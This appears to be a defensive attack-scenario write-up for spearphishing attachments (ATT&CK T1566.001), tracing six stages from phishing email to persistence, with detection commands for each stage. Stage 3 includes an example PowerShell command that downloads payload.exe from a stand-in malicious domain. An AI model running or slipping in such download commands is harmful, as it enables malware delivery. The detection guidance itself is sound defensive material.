Pattern Name: T1566.001 - Spearphishing Attachment

Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes a command and control (C2) channel.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Important Update" and an attached Excel file named "Invoice_2023.xlsx".
- **Key Artifacts**: Email headers, attachment file (Invoice_2023.xlsx).
- **Detection Focus**: Monitor for emails with suspicious attachments or unusual sender addresses.

```shell
# Example of a suspicious email header
grep -i "Important Update" /var/log/mail.log
```

**Stage 2: Opening the Malicious Attachment**
- **Applications Involved**: Microsoft Excel
- **User Action**: The user opens the attachment, triggering the execution of a macro embedded in the Excel file.
- **Key Artifacts**: Excel file with macros, Windows Event Logs indicating the execution of Excel.
- **Detection Focus**: Monitor for the execution of macros in Excel files, especially those that are not digitally signed.

```shell
# Check for macro execution in Excel
Get-WinEvent -LogName "Microsoft-Windows-Application-Experience/Operational" | Where-Object { $_.Message -like "*macro*" }
```

**Stage 3: Payload Execution and C2 Communication**
- **Applications Involved**: PowerShell, cmd.exe, and network stack
- **User Action**: The macro executes a PowerShell command that downloads a payload from a remote server.
- **Key Artifacts**: PowerShell command history, downloaded executable (e.g., malicious.exe), network traffic logs.
- **Detection Focus**: Monitor for PowerShell commands that download files from the internet, especially those that are obfuscated.

```shell
# Example of a PowerShell command that downloads a payload
powershell -Command "Invoke-WebRequest -Uri 'http://malicious-domain.com/payload.exe' -OutFile 'C:\Users\Public\malicious.exe'"
```

**Stage 4: Establishing Command and Control**
- **Applications Involved**: cmd.exe, network stack
- **User Action**: The downloaded payload executes and establishes a reverse shell to the attacker's C2 server.
- **Key Artifacts**: Outbound connections to known malicious IP addresses, command execution logs.
- **Detection Focus**: Monitor for unusual outbound connections, especially those initiated by newly created processes.

```shell
# Check for outbound connections to known malicious IPs
netstat -an | findstr "ESTABLISHED"
```

**Stage 5: Data Exfiltration**
- **Applications Involved**: cmd.exe, network stack
- **User Action**: The attacker issues commands to exfiltrate sensitive data from the compromised system.
- **Key Artifacts**: Large outbound HTTP/S requests, logs of file transfers.
- **Detection Focus**: Monitor for large POST requests or unusual file types being sent to external servers.

```shell
# Monitor for large outbound HTTP POST requests
tcpdump -i eth0 -A 'tcp port 80 and (((ip[2:2] - ((ip[0:1] & 0xf) << 2)) > 1500))'
```

**Stage 6: Persistence Mechanism**
- **Applications Involved**: Windows Task Scheduler, registry
- **User Action**: The malware creates a scheduled task to maintain persistence on the system.
- **Key Artifacts**: Scheduled tasks, registry entries for persistence.
- **Detection Focus**: Monitor for new scheduled tasks or registry modifications that indicate persistence mechanisms.

```shell
# Check for new scheduled tasks
schtasks /query /fo LIST /v | findstr "TaskName"
```
